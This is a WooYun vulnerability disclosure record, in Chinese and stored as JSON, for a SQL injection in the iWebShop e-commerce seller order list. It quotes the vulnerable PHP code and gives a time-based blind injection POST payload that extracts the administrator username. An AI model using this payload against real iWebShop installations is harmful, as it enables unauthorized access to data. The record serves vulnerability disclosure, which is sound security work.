{"id": 39704, "wybug_id": "wooyun-2015-093443", "wybug_title": "Iwebshop最新版注入又一枚", "wybug_corp": "Jooyea", "wybug_author": "路人甲", "wybug_date": "2015-01-28 17:04", "wybug_open_date": "2015-04-28 17:06", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-28：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-04-28：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： Iwebshop最新版注入又一枚 详细说明：  看到wooyun上有人提了几个iweshop（2014-11-18更新）的漏洞（ WooYun: iWebShop开源电子商务系统SQL注入漏洞 ），去官网看了看，在2014-12-16 已更新到了 iwebshop2.9.14121000，下下来研究研究，希望不要重复。注入一枚：POST /index.php?controller=seller&action=order_list    POST参数中的search作为一个数组传入，search的KEY and VALUE 都过滤不完全，注入成功，文件在/controllers/seller.php的order_list()方法中看看代码/controllers/seller.php\npublic function order_list(){\t\t//搜索条件\t\t$seller_id = $this->seller['seller_id'];\t\t$search = IFilter::act(IReq::get('search'));\t\t$page   = IReq::get('page') ? IFilter::act(IReq::get('page'),'int') : 1;\t\t//检索条件\t\tlist($join,$where) = order_class::getSellerSearchCondition($search);\t\t$where .= \" and go.seller_id=\".$seller_id;\t\t//拼接sql\t\t$orderHandle = new IQuery('order_goods as og');\t\t$orderHandle->order  = \"o.id desc\";\t\t$orderHandle->fields = \"o.*\";\t\t$orderHandle->page   = $page;\t\t$orderHandle->join   = $join;\t\t$orderHandle->where  = $where;\t\t\t\t$this->search      = $search;\t\t$this->orderHandle = $orderHandle;\t\t\t$this->redirect('order_list');\t}\n$search 是这样获得的$search = IFilter::act(IReq::get('search'));，去看看IFilter::act/lib/core/util/filter_class.php\n/**\t * @brief 对字符串进行过滤处理\t * @param  string $str      被过滤的字符串\t * @param  string $type     过滤数据类型 值: int, float, string, text, bool, url\t * @param  int    $limitLen 被输入的最大字符个数 , 默认不限制;\t * @return string 被过滤后的字符串\t * @note   默认执行的是string类型的过滤\t */\tpublic static function act($str,$type = 'string',$limitLen = false)\t{\t\tif(is_array($str))\t\t{\t\t\tforeach($str as $key => $val)\t\t\t{\t\t\t\t$resultStr[$key] = self::act($val, $type, $limitLen);\t\t\t}\t\t\treturn $resultStr;\t\t}\t\telse\t\t{\t\t\tswitch($type)\t\t\t{\t\t\t\tcase \"int\":\t\t\t\t\treturn intval($str);\t\t\t\t\tbreak;\t\t\t\tcase \"float\":\t\t\t\t\treturn floatval($str);\t\t\t\t\tbreak;\t\t\t\tcase \"text\":\t\t\t\t\treturn self::text($str,$limitLen);\t\t\t\t\tbreak;\t\t\t\tcase \"bool\":\t\t\t\t\treturn (bool)$str;\t\t\t\t\tbreak;\t\t\t\tcase \"url\":\t\t\t\t\treturn self::clearUrl($str);\t\t\t\t\tbreak;\t\t\t\tcase \"filename\":\t\t\t\t\treturn self::fileName($str);\t\t\t\t\tbreak;\t\t\t\tdefault:\t\t\t\t\treturn self::string($str,$limitLen);\t\t\t\t\tbreak;\t\t\t}\t\t}\t}\n因为在获取$search时，$search = IFilter::act(IReq::get('search')); act()没有指定第二个类型参数，所以，把search 当作string过滤，这里是数字型的，不用闭合单引号，造成注入。Search最终在/view/sysseller/seller/order_list.html中被带入sql执行\n{foreach:items = $this->orderHandle->find()}\n测试方法：申请开店后，登录，然后发送下面的post包即可。Payload:POST提交\nsearch[id]=1 or(select if(ord(mid((select admin_name from admin limit 0,1),1,1))=98,sleep(1),0))#\n因为是time-based blind 注入，猜测管理员用户名的第一个字母时，若错误，延迟1s左右，如下图\n\n若正确，延迟7s左右（和数据库中的记录有关）如下图\n\n   漏洞证明：  见 详细说明   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}